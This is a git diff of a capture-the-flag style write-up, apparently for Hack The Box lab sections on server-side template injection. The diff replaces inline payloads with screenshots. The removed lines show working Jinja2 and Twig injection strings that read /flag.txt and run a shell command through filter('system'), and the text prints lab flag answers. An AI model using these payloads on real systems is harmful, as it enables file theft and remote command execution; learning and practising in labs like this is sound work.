@@ -124,9 +124,7 @@ No questions
 
 1. Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.
 
-```shell
-http://SERVER-IP:PORT/index.php?name={{7*'7'}}
-```
+![mod145_sec08_q01_a00.png](/assets/img/htb/mod145_sec08_q01_a00.png)
 
 Returns 49
 
@@ -138,9 +136,7 @@ Answer: `twig`
 
 The payload is 
 
-```shell
-{{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
-```
+![mod145_sec09_q01_a00.png](/assets/img/htb/mod145_sec09_q01_a00.png)
 
 Answer: `HTB{295649e25b4d852185ba34907ec80643}`
 
@@ -150,14 +146,13 @@ Answer: `HTB{295649e25b4d852185ba34907ec80643}`
 
 The RCE payload is:
 
-```shell
-{{ ['cat /flag.txt'] | filter('system') }}
-```
+![mod145_sec10_q01_a00.png](/assets/img/htb/mod145_sec10_q01_a00.png)
 
 Answer: `HTB{5034a6692604de344434ae83f1cdbec6}`
 
 ## Section 11 - SSTI Tools of the Trade & Preventing SSTI
 No questions
+
 ## Section 12 - Introduction to SSI Injection
 No questions
 
@@ -216,7 +211,7 @@ I get no connection so SSRF seems unlikely, let's try SSTI by fuzzing payloads..
 
 ![mod145_sec18_q01_a04.png](/assets/img/htb/mod145_sec18_q01_a04.png)
 
-We get SSTI injection with payloads `{{7*7}}` and `{{7*'7'}}` meaning the template engine is `Jinja2` or `Twig`
+We get SSTI injection! This means that either `Jinja2` or `Twig` is used..
 
 Next, I attempted RCE for `Jinja2` ...
 
